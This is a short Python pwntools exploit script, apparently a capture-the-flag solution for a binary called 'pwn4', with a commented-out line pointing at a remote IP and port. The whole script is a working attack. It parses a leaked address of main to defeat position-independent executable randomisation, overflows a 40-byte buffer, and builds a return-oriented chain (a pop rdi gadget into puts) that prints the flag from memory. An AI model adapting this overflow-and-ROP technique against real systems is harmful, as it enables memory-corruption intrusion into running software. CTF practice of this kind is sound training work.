from pwn import *

context.binary = binary = ('./pwn4')

p = process('./pwn4')
# p = remote('3.1.32.51', 8002)

elf = ELF(binary)

# gdb.attach(p)

p.recvuntil(b'main: ')
leak = int(p.recvline().strip(), 16)
print(hex(leak))

main = leak - 0x12aa
flag = 0x4040 + main

print(hex(main))
print(hex(flag))
print(hex(elf.plt.puts))

payload = b'A'*40
payload += p64(0x1393+main) #pop rdi
payload += p64(flag)
# payload += p64(0x101a+main)
payload += p64(elf.plt.puts+main)

p.sendline(payload)

p.interactive()